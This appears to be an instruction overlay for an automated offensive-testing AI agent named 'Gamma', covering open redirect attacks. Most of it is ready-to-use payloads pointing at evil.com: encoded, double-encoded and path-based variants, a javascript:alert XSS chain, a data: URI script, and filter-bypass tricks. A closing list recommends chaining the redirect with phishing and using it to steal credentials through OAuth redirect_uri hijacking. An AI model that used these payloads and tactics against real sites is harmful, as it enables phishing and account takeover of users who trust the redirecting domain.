# Open Redirect — Dynamic Overlay

## Metadata
- **Exploit Type**: open_redirect
- **Applies To**: Gamma
- **Loading**: Appended when `exploit_type === "open_redirect"`

---

## OVERLAY_CONTEXT

Open redirect vulnerabilities allow an attacker to redirect victims to arbitrary domains. While low-severity on its own, it's a critical component in phishing campaigns and can be chained with other attacks (SSRF, OAuth hijacking).

---

## Payloads

### Basic Redirect
```
/redirect?url=https://evil.com
/login?next=https://evil.com
?url=https://evil.com
?return=https://evil.com
```

### Encoded Variants
```
/redirect?url=https%3A%2F%2Fevil.com
/redirect?url=https://evil%E2%80%A6.com
```

### Double Encoding
```
/redirect?url=https%253A%252F%252Fevil.com
```

### Path-Based
```
/redirect?url=//evil.com
/redirect?url=/\evil.com
/redirect?url=///evil.com
```

### XSS Chained
```
/redirect?url=javascript:alert(document.domain)
```

---

## Bypass Techniques

### Protocol Relative URL
```
//evil.com
```

### Trusted Domain Prepend
```
https://target.com.evil.com
```

### Unicode Homograph
```
https://target.com@evil.com (if @ is not validated)
```

### URL Fragment
```
https://target.com#@evil.com
```

### Data URI (if reflected in link)
```
data:text/html,<script>alert(1)</script>
```

---

## Constraints

```
- Open redirect is typically low severity alone — chain with phishing for impact
- Use for credential theft via OAuth redirect_uri hijacking
- Can be used in SSRF-like attacks if URL is fetched server-side
- Always verify the redirect actually occurs (check Location header)
```

---

*Overlay version: 1.0*
